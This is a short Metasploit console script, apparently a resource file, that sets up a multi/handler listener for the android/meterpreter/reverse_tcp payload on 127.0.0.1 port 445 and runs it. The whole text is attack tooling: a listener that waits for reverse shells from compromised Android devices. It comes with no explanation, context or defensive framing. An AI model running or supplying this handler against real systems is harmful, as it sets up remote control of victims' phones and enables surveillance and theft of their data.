
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 445
run 
